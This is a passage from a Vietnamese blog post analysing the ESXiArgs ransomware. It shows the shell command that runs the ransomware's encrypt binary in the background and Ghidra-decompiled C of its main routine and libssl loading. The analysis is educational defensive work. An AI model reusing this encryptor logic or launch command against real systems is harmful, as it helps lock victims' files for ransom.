<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span></code></pre></div><p>Đường dẫn file, kích cỡ file và số bước mã hóa sẽ được truyền vào trong file nhị phân <code>encrypt</code>. File này cũng lấy 1 cái khóa công khai. Output của câu lệnh này sẽ được truyền vào <code>/dev/null</code> để không output ra console.</p>
<p>Script này cũng dùng <code>nohup</code> để thực thi file nhị phân này trong background. Nó làm vậy để có thể mã hóa nhiều file cùng 1 lúc.</p>
<p>Sau khi mình nghiên cứu về con mã độc này, mình biết là tác giả con mã độc này sẽ dùng 2 file nhị phân là <code>encrypt</code> và <code>decrypt</code>. File <code>decrypt</code> sẽ cần 1 <em>khóa bí mật</em>. Khóa này sẽ được giữ bởi tác giả mã độc và nạn nhân của con mã độc này sẽ cần trả tiền cho tác giả để lấy được khóa bí mật đó.</p>
<p>Mình sẽ phân tích file <code>encrypt</code> bởi vì nó là lõi của mã độc này.</p>
<h1 id="phân-tích-file-nhị-phân-encrypt">Phân tích file nhị phân encrypt</h1>
<p>Đầu tiên thì mình sử dụng câu lệnh <code>file</code> để xem file có những gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file encrypt
</span></span><span style="display:flex;"><span>encrypt: ELF 64-bit LSB executable, x86-64, version <span style="color:#d19a66">1</span> <span style="color:#56b6c2">(</span>SYSV<span style="color:#56b6c2">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#c678dd">for</span> GNU/Linux 2.6.8, with debug_info, not stripped
</span></span></code></pre></div><p>Mình thấy là nó là file <code>ELF 64-bit</code>  bởi vì mã độc này chạy trên các bộ xử lý x64. <code>dynamically linked</code> có nghĩa là mã độc này được biên dịch với <code>GCC</code> bình thường, không sử dụng cờ biên dịch gì phức tạp.</p>
<p>Nó cũng được biên dịch cho <code>GNU/Linux 2.6.8</code>. Đây là 1 phiên bản Linux khá là cũ.</p>
<p>Có 1 điều lạ ở đây là file nhị phân này có <code>debug_info, not stripped</code>. Thường thì các tác giả mã độc sẽ &ldquo;lột&rdquo; các thông tin debug từ 1 cái file nhị phân bởi vì họ không muốn mã độc của họ bị phân tích và dịch ngược. Nhưng mà mã độc ESXiArgs này lại vẫn còn các thông tin debug. Tức là các hàm trong file này vẫn còn các thông tin và file này cũng còn giữ thông tin từ <code>GCC</code> về quá trình biên dịch của nó.</p>
<p>Tiếp theo thì mình chạy thử câu lệnh <code>strings</code> để xem bên trong file nhị phân này có những gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings encrypt
</span></span></code></pre></div><p>Bởi vì file không bị làm rối và bị &ldquo;lột&rdquo;, mình đi tìm thông tin liên quan đến mã hóa và mình tìm được cái này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>BIO_new_mem_buf
</span></span><span style="display:flex;"><span>ERR_get_error
</span></span><span style="display:flex;"><span>ERR_error_string
</span></span><span style="display:flex;"><span>PEM_read_bio_RSA_PUBKEY
</span></span><span style="display:flex;"><span>PEM_read_bio_RSAPrivateKey
</span></span><span style="display:flex;"><span>RAND_pseudo_bytes
</span></span><span style="display:flex;"><span>RSA_public_encrypt
</span></span><span style="display:flex;"><span>RSA_private_decrypt
</span></span><span style="display:flex;"><span>RSA_size
</span></span></code></pre></div><p><code>PEM_read_bio_RSA_PUBKEY</code> sẽ đọc file khóa công khai. <code>PEM_read_bio_RSAPrivateKey</code> sẽ đọc file khóa bí mật. <code>RAND_pseudo_bytes</code> sẽ tạo ra byte random, byte này chắc sẽ được sử dụng cho việc mã hóa.</p>
<p>Mình cũng tìm được <code>RSA_public_encrypt</code> và <code>RSA_private_decrypt</code>. Thế file nhị phân này chắc sẽ sử dụng thuật toán mã hóa bất đối xứng <strong>RSA</strong>.</p>
<p><em>Mã hóa bất đối xứng</em> nó như là 1 hòm thư. Hòm thư là 1 vật công cộng, ai cũng có thể đút thư vào nó. Nhưng chỉ có chủ của hòm thư đó mới có chìa khóa để mở hòm thư đó và đọc thư trong đó.</p>
<p><em>Mã hóa bất đối xứng</em> cũng giống như vậy. Nó sử dụng 2 khóa, <em>khóa công khai</em> và <em>khóa bí mật</em>. Khóa công khai sẽ được phân phát cho các máy khác. Khi mà 1 người nào đó muốn gửi dữ liệu cho mình thì họ sẽ sử dụng khóa công khai của mình để mã hóa dữ liệu và mình sẽ sử dụng khóa bí mật của mình để giải mã dữ liệu đã được mã hóa. Phương thức này rất an toàn bởi vì nếu như hacker lấy được cả dữ liệu và khóa công khai thì họ cũng không thể làm gì được bởi vì khóa công khai không thể giải mã được, nó chỉ mã hóa được. Một khi dữ liệu được mã hóa với khóa công khai thì nó chỉ có thể được giải mã bằng khóa bí mật.</p>
<p>File nhị phân này sẽ sử dụng <code>RSA_public_encrypt</code> với 1 khóa công khai để mã hóa các file và <code>RSA_private_decrypt</code> với 1 khóa bí mật để giải mã các file.</p>
<p>Để tìm hiểu sâu hơn về mã độc này, mình sẽ sử dụng 1 chương trình phân dịch để dịch ngược file này.</p>
<h1 id="phân-dịch-file-nhị-phân">Phân dịch file nhị phân</h1>
<p>Mình sẽ sử dụng chương trình phân dịch <a href="https://ghidra-sre.org/">[<strong>Ghidra</strong>]</a> bởi vì mình đang học cách dùng nó.</p>

    <img src="/img/esxiargs-analysis/ghidra-esxiargs.png"  alt="ESXiArgs trong Ghidra"  class="center"  style="padding: 10px"  />


<p>Đây là hàm <code>main</code> trong file nhị phân <code>encrypt</code> này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_38</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_30</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_28</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_20</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_18</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">local_c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x18</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x20</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>),<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">local_18</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x10</span>),<span style="color:#e06c75">local_20</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;encrypt_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;create_rsa_obj&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;get_pk_data&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;init_libssl returned %d</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_c</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mình sẽ phân tích từng phần code trong hàm <code>main</code> này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span></code></pre></div><p>Chúng ta thấy được là hàm <code>main</code> sẽ lấy 2 tham số. Thường thì trong chương trình C, 2 tham số này sẽ là <code>argc</code> và <code>argv</code>. <code>argc</code> là số các đối số và <code>argv</code> là mảng chứa các đối số đó.</p>
<p>Để làm cho việc phân tích file nhị phân này dễ hơn thì khi mà mình đoán được 1 biến được sử dụng để làm gì thì mình sẽ đặt lại tên cho nó. Mình sẽ đặt tên <code>param_1</code> thành <code>argc</code> và <code>param_2</code> thành <code>argv</code></p>
<p>Và bởi vì <code>param_2</code> có kiểu dữ liệu là <code>long</code>, mình sẽ đổi nó thành <code>char**</code> bởi vì đó là kiểu dữ liệu mà <code>argv</code> sử dụng.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">argc</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn code này sẽ in ra cách sử dụng file nhị phân này. Từ đây mình thấy là nó sẽ cần file khóa công khai và đường dẫn tới file cần được mã hóa. Mình cũng thấy là file này có thể lấy thêm các đối số khác như là số bước mã hóa, độ lớn file và số MB trong block mã hóa.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">3</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">4</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">5</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn code này sẽ check xem file nhị phân có thêm đối số, nếu có thì nó sẽ xử lý các đối số thêm đó. Các đối số thêm đó đã được nhắc đến trong tin nhắn sử dụng trên.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span></code></pre></div><p>Ở đây thì chương trình sẽ gọi hàm <code>init_libssl()</code>. Hàm này nghe khá thú vị nên mình sẽ check xem hàm này sẽ làm những gì.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#98c379">&#34;libssl.so&#34;</span>,<span style="color:#d19a66">2</span>);
</span></span></code></pre></div><p>Trong hàm này sẽ sử dụng hàm <code>dlopen()</code>. Hàm này sử dụng trình liên kết để mở file <code>libssl.so</code>. Trình liên kết sẽ liên kết các file đã được biên dịch với chương trình hiện tại. Thế là hàm này đang cố liên kết file <code>libssl.so</code> với file nhị phân này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0x10</span>; <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">sprintf</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#98c379">&#34;libssl.so.%d&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_3c</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>) <span style="color:#c678dd">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">goto</span> <span style="color:#e06c75">LAB_00400de1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tiếp theo thì nếu như <code>plibssl == 0</code> (nếu như hàm <code>dlopen()</code> fail, không mở được file <code>libssl.so</code>) thì nó sẽ cố tìm 1 phiên bản nào đó của <code>libssl.so</code> bằng cách dùng kí tự wildcard <code>&quot;libssl.so.%d&quot;</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lBIO_new_mem_buf</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>);
</span></span></code></pre></div><p>Sau khi nó tìm được 1 file <code>libssl.so</code>, nó sẽ sử dụng <code>dlsym()</code> để load symbol <code>BIO_new_mem_buf</code> từ libssl trong khi chạy.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;ERR_error_string&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSAPrivateKey&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">6</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">7</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
